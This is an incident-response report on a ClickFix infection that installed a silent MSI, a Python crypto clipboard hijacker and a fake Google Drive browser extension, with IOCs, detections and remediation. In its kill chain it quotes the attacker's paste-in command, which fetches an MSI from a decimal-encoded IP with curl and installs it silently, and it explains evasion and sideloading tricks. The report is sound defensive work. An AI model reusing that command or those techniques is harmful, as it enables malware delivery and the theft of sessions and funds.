# CFC-2026-0001 — ClickFix lure → silent MSI → Python crypto clipper + sideloaded fake "Save to Google Drive" extension

*Research report. Victim identity, hostnames, accounts and internal network details are redacted. All IOCs are defanged. No samples are distributed.*

## Abstract
In October 2026 a Windows 10/11 victim workstation was compromised after the user followed a ClickFix-style "verification / fix" prompt and pasted a command into a Windows shell. The command downloaded an MSI from a host referenced by a **decimal-encoded IPv4** and installed it silently. The MSI ran an obfuscated, in-memory PowerShell loader that (1) dropped a portable Python runtime with a persistent **crypto clipboard hijacker**, and (2) sideloaded a **Manifest V3 browser extension impersonating Google's "Save to Google Drive"** into every Chromium profile (Chrome, Edge, Brave) by editing `Secure Preferences`. The extension had cookie, clipboard, history, tab, scripting and web-request permissions on all URLs, contacted its panel and fetched a target configuration covering banks, payment providers, exchanges, webmail, messengers and admin panels. Microsoft Defender raised **no detection**. The host was contained and cleaned in place within ~3 hours.

## Timeline (UTC+7, 2026-10-24)
| Time | Event | Confidence |
|---|---|---|
| ~03:18–03:28 | User visits a free video-download tool site and a "vibe-code hacking" YouTube video; one of these is the suspected lure | HYPOTHESIS |
| 03:36 | User pastes command; `curl.exe` fetches MSI to `%TEMP%\S854.msi`; `msiexec /qn` installs it | OBSERVED_ON_HOST |
| 03:36 | PowerShell in-memory loader (ScriptBlock log 4104); later PowerShell crash | OBSERVED_ON_HOST |
| 03:36 | Python runtime + `CorporationPackages.py` dropped, HKCU Run persistence | OBSERVED_ON_HOST |
| 03:36 | Extension registered in 11 Chromium profiles | OBSERVED_ON_HOST |
| 03:37 | Extension fetches remote target config; refreshed 04:36 | OBSERVED_ON_HOST |
| 04:44 | Defender full scan: no detections | OBSERVED_ON_HOST |
| ~05:30 | Most-used browser profile closed; containment begins | OBSERVED_ON_HOST |
| ~06:00+ | Implant killed, persistence removed, extension removed, artifacts quarantined | OBSERVED_ON_HOST |

## Kill chain
1. **Lure (T1204.004 – Malicious Copy and Paste):** fake prompt instructs Win+R / shell paste.
2. **Download & execute:**
   ```
   cmd /c curl.exe -fsL --ssl-no-revoke --retry 8 ... -o "%TEMP%\S854.msi" hxxp://392073610/89583 && msiexec /i "%TEMP%\S854.msi" /qn /norestart
   ```
   `392073610` is the decimal form of `23.94.145[.]138` — a simple trick to evade URL/IP pattern matching.
3. **MSI (T1218.007):** randomised metadata (ProductName `eDVBKxgzxW KfXWE2nr`, Manufacturer `rz7V1jL9FsWo`, v1.1.8197), embedded streams `BjXHqL3v1A`, `DKY1Ym3n`, `NNYgUYOujhV`, plus a recoverable PE.
4. **Loader (T1059.001, T1027, T1620):** obfuscated PowerShell using `DefineDynamicAssembly` reflection and environment-variable gating; ~2.4 MB in / ~116 KB out per SRUM.
5. **Clipper (T1115, T1547.001):** portable `pythonw.exe` in `C:\ProgramData\ApplicationApp\` running `CorporationPackages.py` via HKCU `Run\CorporationPackages`. Layers: XOR(225) / Caesar / AES. Hardcoded BTC, LTC, TRON wallets and an ETH regex. **SRUM showed zero network bytes** for this process — it only swaps clipboard addresses.
6. **Browser extension (T1176, T1539, T1185, T1090):** unpacked into a random folder under `%LOCALAPPDATA%`, injected into each profile's `Secure Preferences` (bypassing the Web Store). Name "Save to Google Drive", author "Google inc." (note lowercase *inc.*), v4.0.6. Permissions: `cookies, clipboardRead/Write, history, tabs, webRequest, scripting, management, declarativeNetRequest, <all_urls>`; MAIN-world `document_start` content scripts; a DNR ruleset stripping CSP. Code markers: `GET_COOKIES`, `SEED_FOUND`, `startProxy`, `/api` panel; strings split and RC4-encrypted.
7. **Staged payload:** `%LOCALAPPDATA%\ifwf.e4` (encrypted blob) with five 64-byte `.png` files that actually hold hex keys.

## Indicators of compromise
See [`iocs.csv`](iocs.csv). Key items:
| Type | Value |
|---|---|
| IPv4 (delivery) | `23.94.145[.]138` (`hxxp://392073610/89583`) |
| SHA256 MSI (4,708,864 B) | `20e5e0ed243d9c691cfe7320434708b419448ac7b38fdc963688829a747be821` |
| SHA256 recovered PE | `f5f2d1f10a88e782ffbbdf3c0698aaa1fc72fa19ba7ca6121fe9a7d4f9f65d5e` |
| SHA256 CorporationPackages.py | `56f8f2420000e1593d9ad13d6c81e8161f0cb0b47b2107fd198420df7a8522d6` |
| MSI ProductCode | `{65D05901-10A5-455A-9FD4-9E5EC7004455}` |
| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\CorporationPackages` |
| Path | `C:\ProgramData\ApplicationApp\` |
| Extension | "Save to Google Drive" / "Google inc." / 4.0.6, unpacked, not from Web Store |
| Attacker wallets | listed in `iocs.csv` |

## MITRE ATT&CK
T1204.004, T1059.003, T1105, T1218.007, T1059.001, T1027, T1620, T1547.001, T1115, T1176, T1539, T1185, T1090, T1562.001 (CSP stripping, analogous), T1036 (masquerading as Google).

## Detection
- Process: `curl.exe` with a purely numeric host; `msiexec /i %TEMP%\*.msi /qn`; `pythonw.exe` under `C:\ProgramData\*`.
- Registry: new HKCU Run value pointing to `pythonw.exe` in ProgramData.
- Browser: extension in `Secure Preferences` with `location` = unpacked and path outside the browser's Extensions dir; author impersonating Google.
- PowerShell 4104 with `DefineDynamicAssembly` + env-var reads.
- Sample rules: [`detections/`](detections/) — **UNTESTED**.

## Remediation used
1. Kill `pythonw.exe` implant; back up then delete the Run value.
2. Move (not delete) dropped folders and blobs into a quarantine directory for analysis.
3. Close all browsers; back up and remove the extension entry from every profile's `Secure Preferences` and its folder.
4. Remove the MSI's registry footprint after export (`msiexec /x` avoided: it could run attacker custom actions).
5. Contain network: drop file-share sessions, outbound/inbound firewall block of private ranges, disable remote-access tools until their passwords are rotated, block the delivery IP.
6. Copy SRUM (`esentutl /y /vss`) to measure per-process network usage.
7. Rotate credentials in priority order: accounts whose sessions were open in infected browser profiles → anything typed/visited during the window → stored network credentials → developer tokens. Revoke all sessions, review 2FA and third-party app grants.

## Lessons
- AV silence ≠ clean: Defender found nothing.
- Browser extensions sideloaded via `Secure Preferences` survive casual inspection and are the highest-impact component (session theft).
- Decimal IP notation is a cheap, high-signal detection.
- Asking the user a few yes/no questions (what did you paste, what did you log into, did you copy secrets) dramatically narrowed exposure.

## Limitations / unknowns
- The extension's panel address was encrypted and not recovered; exfiltration volume could not be separated from normal browser traffic.
- The exact lure page is not confirmed (in-page prompts leave little history).
- `ifwf.e4` was not decrypted; its purpose is unknown.
